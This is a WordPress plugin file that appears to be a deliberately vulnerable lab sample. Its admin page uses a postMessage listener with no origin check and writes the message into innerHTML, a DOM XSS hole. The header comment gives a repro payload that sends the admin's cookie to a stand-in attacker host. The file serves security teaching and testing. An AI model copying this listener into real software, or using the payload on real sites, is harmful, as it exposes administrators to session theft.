<?php
/*
Plugin Name: BZ postMessage XSS
Description: Admin page with a message listener that writes e.data into innerHTML.
Version: 1.0.0
Author: Ayi NEDJIMI
Author URI: https://github.com/ayi-nedjimi
License: GPL-2.0
*/

/*
 * VULN CLASS: DOM XSS via window.postMessage (CWE-79 / OWASP A03)
 *
 * The admin page registers a 'message' listener with NO origin check and
 * assigns event.data to element.innerHTML. Any page that can frame or open
 * this admin page can execute JS in admin context.
 *
 * Repro (open in browser while logged in as admin):
 *   <iframe id=f src="http://localhost:8080/wp-admin/admin.php?page=bz-pm-xss"></iframe>
 *   <script>
 *     f.onload = () => f.contentWindow.postMessage(
 *       '<img src=x onerror="fetch(\'//attacker/?c=\'+document.cookie)">', '*');
 *   </script>
 */

if (!defined('ABSPATH')) { exit; }

add_action('admin_menu', function () {
    add_menu_page('BZ postMessage XSS', 'BZ pmXSS', 'read', 'bz-pm-xss', 'bz_pm_xss_page');
});

function bz_pm_xss_page() {
    ?>
    <div class="wrap">
        <h1>BZ postMessage XSS</h1>
        <p>Output sink:</p>
        <div id="bz-pm-sink" style="border:1px solid #ccc;padding:1em;">(waiting for message)</div>
        <script>
        // VULN: no origin check, innerHTML sink
        window.addEventListener('message', function (e) {
            document.getElementById('bz-pm-sink').innerHTML = e.data;
        });
        </script>
    </div>
    <?php
}
